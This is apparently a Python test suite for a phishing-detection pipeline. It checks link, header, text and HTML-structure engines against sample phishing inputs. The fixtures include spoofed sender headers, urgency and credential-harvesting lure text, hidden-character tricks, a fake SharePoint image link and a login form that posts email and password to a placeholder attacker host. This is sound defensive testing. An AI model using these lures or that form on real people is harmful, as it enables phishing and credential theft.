"""
Functional test suite for the 5 critical evasion techniques.
Tests each engine independently to verify the patches work.
"""
import sys
sys.path.insert(0, ".")

from pipeline.engine_header import HeaderAnalysisEngine
from pipeline.engine_structure import StructuralAnalysisEngine
from pipeline.engine_nlp import NLPAnalysisEngine
from pipeline.engine_links import LinkAnalysisEngine

PASS = 0
FAIL = 0

def check(name, condition, detail=""):
    global PASS, FAIL
    if condition:
        PASS += 1
        print(f"  ✅ PASS: {name}")
    else:
        FAIL += 1
        print(f"  ❌ FAIL: {name} — {detail}")


print("=" * 70)
print("TEST CASE 1: Visual vs Technical Destination Mismatch (Engine 4)")
print("=" * 70)

engine4 = LinkAnalysisEngine()

# Tier 1: Full URL display text → different href
html_tier1 = '<html><body><a href="http://secure-login-update-baddomain.com/login">https://www.paypal.com/secure/auth</a></body></html>'
r1 = engine4.analyze(html_body=html_tier1)
check("Tier 1 - Full URL mismatch detected", r1.href_mismatch_detected, f"score={r1.href_mismatch_score}")
check("Tier 1 - Score >= 20", r1.score >= 20, f"score={r1.score}")

# Tier 2: Bare domain display text → different href
html_tier2 = '<html><body><a href="http://evil-phishing.xyz/steal">paypal.com</a></body></html>'
r2 = engine4.analyze(html_body=html_tier2)
check("Tier 2 - Bare domain mismatch detected", r2.href_mismatch_detected, f"score={r2.href_mismatch_score}")

# Tier 3: Brand name in display text → non-brand href
html_tier3 = '<html><body><a href="http://evil-phishing.xyz/login">Verify your PayPal account</a></body></html>'
r3 = engine4.analyze(html_body=html_tier3)
check("Tier 3 - Brand name mismatch detected", r3.href_mismatch_detected, f"score={r3.href_mismatch_score}")

# Negative test: legitimate PayPal link should NOT flag
html_legit = '<html><body><a href="https://www.paypal.com/signin">Log in to PayPal</a></body></html>'
r_legit = engine4.analyze(html_body=html_legit)
check("Negative - Legit PayPal link NOT flagged", not r_legit.href_mismatch_detected, f"detected={r_legit.href_mismatch_detected}")

print()
print("=" * 70)
print("TEST CASE 2: Display Name Spoofing + Reply-To Mismatch (Engine 1)")
print("=" * 70)

engine1 = HeaderAnalysisEngine()

# Spoofed display name + freemail reply-to
email_spoof = """From: "Microsoft Support Team" <wordpress-admin@random-hacked-blog.com>
Reply-To: it-support-desk-2026@gmail.com
To: victim@company.com
Subject: Password Reset Required
Date: Thu, 22 May 2026 10:00:00 +0000
MIME-Version: 1.0
Content-Type: text/plain

Please reset your password immediately.
"""
r_spoof = engine1.analyze(email_spoof)
check("Display name spoofing detected", r_spoof.display_name_spoofing_detected)
check("Reply-To mismatch detected", r_spoof.reply_to_mismatch_detected)
freemail = r_spoof.raw_signals.get("reply_to_is_freemail", False)
check("Freemail Reply-To flagged", freemail)
check("Score >= 15 (spoofing + mismatch + freemail + compound)", r_spoof.score >= 15, f"score={r_spoof.score}")

print()
print("=" * 70)
print("TEST CASE 3: Urgency + Consequence + Action NLP Triad (Engine 3)")
print("=" * 70)

engine3 = NLPAnalysisEngine(config={"model": {"name": "none"}})

triad_text = """URGENT: Your Office365 password will expire in 2 hours. 
If you do not verify your account immediately, your mailbox will be permanently suspended. 
Click here to retain access and confirm your credentials."""

r_nlp = engine3.analyze(triad_text)
check("Urgency score > 0", r_nlp.urgency_coercion_score > 0, f"urgency={r_nlp.urgency_coercion_score}")
check("Credential harvesting score > 0", r_nlp.credential_harvesting_score > 0, f"cred={r_nlp.credential_harvesting_score}")
check("Phishing probability >= 0.20 (heuristic mode)", r_nlp.phishing_probability >= 0.20, f"prob={r_nlp.phishing_probability}")
triad_applied = r_nlp.raw_signals.get("triad_boost_applied", 0)
check("Triad compound boost applied", triad_applied > 0, f"boost={triad_applied}")
check("Multiple trigger phrases found", len(r_nlp.trigger_phrases) >= 3, f"phrases={r_nlp.trigger_phrases}")

# MFA bypass test
mfa_text = "Please approve the notification on your phone to verify your identity. Enter the verification code sent to your device."
r_mfa = engine3.analyze(mfa_text)
check("MFA bypass patterns detected", r_mfa.credential_harvesting_score > 0, f"cred={r_mfa.credential_harvesting_score}")

# OAuth test
oauth_text = "This application needs access to your account. Grant access to continue. Sign in with Microsoft to review permissions."
r_oauth = engine3.analyze(oauth_text)
check("OAuth consent score > 0", r_oauth.oauth_consent_score > 0, f"oauth={r_oauth.oauth_consent_score}")

print()
print("=" * 70)
print("TEST CASE 4: HTML Obfuscation & Zero-Width Characters (Engine 2)")
print("=" * 70)

engine2 = StructuralAnalysisEngine()

# Zero-width character injection (HTML entities)
html_zwc = '<html><body><p>P\u200Ba\u200By\u200BP\u200Ba\u200Bl</p></body></html>'
r_zwc = engine2.analyze(html_body=html_zwc, plain_text=None)
check("Zero-width chars detected", r_zwc.zero_width_chars_detected, f"count={r_zwc.zero_width_char_count}")
check("Cleaned text produced", r_zwc.cleaned_text is not None, f"cleaned={r_zwc.cleaned_text}")
check("ZWC score > 0", r_zwc.zero_width_chars_score > 0, f"score={r_zwc.zero_width_chars_score}")

# CSS hidden text
html_hidden = '<html><body>Pass<span style="display:none;">random_junk</span>word</body></html>'
r_hidden = engine2.analyze(html_body=html_hidden, plain_text=None)
check("Hidden text detected (display:none)", r_hidden.hidden_text_detected, f"methods={r_hidden.hidden_text_methods}")

print()
print("=" * 70)
print("TEST CASE 5: Fake Infrastructure Lure (Engines 2, 3, 4)")
print("=" * 70)

# Image-wrapped link with minimal text
html_fake = """<html><body>
<a href="http://evil-sharepoint.xyz/login"><img src="https://cdn.microsoft.com/sharepoint-icon.png" width="600"/></a>
<p>HR_Salary_Adjustments_Q3.pdf - Shared securely via Microsoft SharePoint.</p>
</body></html>"""

r_link = engine4.analyze(html_body=html_fake)
check("Image-wrapped link detected", r_link.image_wrapped_link_detected, f"score={r_link.image_wrapped_link_score}")
check("Image-wrapped link score > 0", r_link.image_wrapped_link_score > 0)

# Brand mismatch on the "SharePoint" text (Tier 3) pointing to evil domain
check("Href mismatch also flagged (brand in text)", r_link.href_mismatch_detected or r_link.image_wrapped_link_detected, 
      f"mismatch={r_link.href_mismatch_detected}")

# Engine 3: The real trick is that the text LOOKS benign.
# NLP should NOT necessarily flag "Shared via SharePoint" alone.
# The detection comes from Engine 4 (image-wrapped link + login URL on .xyz TLD)
# Verify Engine 4 catches the compound threat
check("Engine 4 login URL pattern on suspicious TLD",
      r_link.login_url_pattern_detected,
      f"login_pattern={r_link.login_url_pattern_detected}")
check("Engine 4 suspicious TLD detected", 
      len(r_link.suspicious_tlds) > 0 or r_link.login_url_pattern_detected,
      f"suspicious_tlds={r_link.suspicious_tlds}")
check("Engine 4 total score >= 15 (compound: image-wrap + login + TLD)",
      r_link.score >= 15,
      f"score={r_link.score}")

print()
print("=" * 70)
print("CREDENTIAL HARVESTING: Embedded Forms (Engine 2)")
print("=" * 70)

# Embedded login form
html_form = """<html><body>
<h1>Sign in to your account</h1>
<form action="http://evil-harvester.com/collect">
  <input type="text" name="email" placeholder="Enter your email">
  <input type="password" name="password" placeholder="Enter your password">
  <button type="submit">Sign In</button>
</form>
</body></html>"""

r_form = engine2.analyze(html_body=html_form, plain_text=None)
check("Credential form detected", r_form.credential_form_detected, f"score={r_form.credential_form_score}")
check("Credential form score >= 10", r_form.credential_form_score >= 10, f"score={r_form.credential_form_score}")
check("Form details captured", len(r_form.credential_form_details) > 0, f"details={r_form.credential_form_details}")

# Negative: no form → should not flag
html_no_form = "<html><body><p>Hello world!</p></body></html>"
r_no_form = engine2.analyze(html_body=html_no_form, plain_text=None)
check("Negative - No form → NOT flagged", not r_no_form.credential_form_detected)


print()
print("=" * 70)
print(f"RESULTS: {PASS} passed, {FAIL} failed out of {PASS + FAIL} checks")
print("=" * 70)

if FAIL > 0:
    print("⚠️  SOME TESTS FAILED — investigate before retraining!")
    sys.exit(1)
else:
    print("🎯 ALL TESTS PASSED — Pipeline is ready for final retrain!")
    sys.exit(0)
